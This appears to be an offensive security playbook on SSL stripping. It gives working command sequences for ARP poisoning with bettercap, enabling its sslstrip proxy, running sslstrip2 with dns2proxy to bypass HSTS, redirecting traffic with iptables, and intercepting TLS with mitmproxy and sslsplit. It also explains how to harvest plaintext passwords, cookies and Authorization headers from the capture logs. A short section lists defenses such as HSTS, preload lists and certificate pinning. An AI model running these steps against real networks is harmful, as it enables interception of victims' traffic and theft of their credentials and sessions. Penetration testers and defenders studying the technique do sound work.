# SSL Stripping

## When this applies

- Attacker has L2/L3 MITM position (ARP poisoning, rogue AP, BGP hijack, network tap).
- Victim navigates to a site via HTTP first (no HSTS preload, no manual `https://`).
- Goal is to keep victim's connection on HTTP while transparently proxying to the real HTTPS site, capturing credentials and cookies in plaintext.

## Technique

When a user types `bank.com` (no scheme) the browser tries `http://bank.com`. The real server responds 301/302 to HTTPS — the attacker rewrites this to a same-origin HTTP URL and proxies upstream HTTPS connection on the victim's behalf. From the victim's view: "looks like normal HTTP". From the server's view: "normal HTTPS client". Cleartext credentials transit the attacker.

## Steps

### 1. Establish MITM position

See `scenarios/mitm/arp-poisoning.md`. SSL stripping requires that victim HTTP traffic flow through the attacker.

```bash
# Bring up forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Bidirectional ARP poison
sudo bettercap -iface eth0 -eval "
  set arp.spoof.targets VICTIM_IP;
  set arp.spoof.fullduplex true;
  arp.spoof on
"
```

### 2. Run sslstrip-style proxy

#### Bettercap https.proxy module

```bash
sudo bettercap -iface eth0 -eval "
  set arp.spoof.targets VICTIM_IP;
  set arp.spoof.fullduplex true;
  arp.spoof on;
  set https.proxy.sslstrip true;
  https.proxy on;
  http.proxy on
"
```

Bettercap rewrites `https://` links in served HTML to `http://` (or `http://...:443/`-style if the server is HTTPS-only) and acts as the upstream HTTPS client.

#### sslstrip2 + dns2proxy

```bash
# Classic sslstrip with HSTS bypass via host renaming
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
python2 sslstrip.py -l 8080 -w mitm.log &
python2 dns2proxy.py &
```

dns2proxy returns DNS responses for renamed hosts (`wwww.bank.com` instead of `www.bank.com`) to bypass HSTS preload checks based on hostname.

### 3. Capture credentials

```bash
# tail the log
tail -f mitm.log

# Bettercap auto-extracts known credential patterns:
events.show
```

Look for:
- POST bodies with `username=...&password=...`
- Authorization headers
- Set-Cookie session tokens

### 4. mitmproxy with --tls-noverify (for certain test scenarios)

When the victim is a custom client without cert pinning:

```bash
mitmproxy -p 8080 --mode transparent --ssl-insecure --tls-noverify
```

For a transparent proxy:

```bash
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
```

mitmproxy presents its own CA cert; victim must trust it (auto-trusted in test environments where the attacker can install the CA).

### 5. sslsplit for transparent SSL/TLS interception

```bash
sslsplit -D -l connections.log -j /var/run/sslsplit \
  -S logs/ -k ca.key -c ca.crt \
  ssl 0.0.0.0 8443 \
  tcp 0.0.0.0 8080
```

sslsplit fork-and-MITMs each connection; useful when sslstrip's link rewriting fails (e.g. apps that don't follow Location headers).

### 6. Defenses to recognize and document

- **HSTS** (`Strict-Transport-Security`) — once seen by the browser, future http:// requests are auto-upgraded; sslstrip is defeated.
- **HSTS preload list** — hardcoded into Chromium, Firefox, Safari, Edge. Includes `*.google.com`, `*.facebook.com`, `*.github.com`, etc.
- **Cert pinning** in mobile/desktop apps — apps reject the attacker's CA, dropping the connection.
- **Browser-level "Always use HTTPS"** (Chrome, Firefox 100+) — manually typing `bank.com` defaults to https:// after first HTTPS contact.
- **DoH / DoT** — DNS resolved encrypted to a third party, dns2proxy can't tamper.

## Verifying success

- Captured POST bodies in `mitm.log` containing plaintext credentials.
- Victim's URL bar shows `http://` while attacker's upstream is `https://`.
- Authorization / Cookie headers visible in HTTP traffic between victim and attacker.

## Common pitfalls

- **HSTS makes sslstrip worthless** for any site with `Strict-Transport-Security` previously seen by the browser. Modern browsers cache HSTS aggressively.
- **HSTS preload** covers thousands of popular sites — sslstrip never works against them.
- **HTTP/3 / QUIC** uses UDP/443 — TCP-only attack tools miss it. Most browsers fall back to TCP if UDP/443 is blocked.
- **Browsers fetch favicon over HTTPS first** in some configurations, leaking the secure scheme before sslstrip sees the request.
- **SOP / CSP** in modern HTML may break the rewritten page, alerting the victim.
- **HTTPS-only mode** in Firefox/Chrome blocks all http:// requests by default in some profiles.
- **Network detection**: many EDR/NDR alerts on dramatic drop in HTTPS proportion or unusual cert chains.

## Tools

- bettercap (`https.proxy.sslstrip`)
- sslstrip / sslstrip2 (Moxie Marlinspike's classic)
- dns2proxy (HSTS bypass via DNS rewriting)
- sslsplit (transparent split-MITM)
- mitmproxy (manual / transparent inspection with `--tls-noverify`)
- iptables / pf (transparent redirect setup)
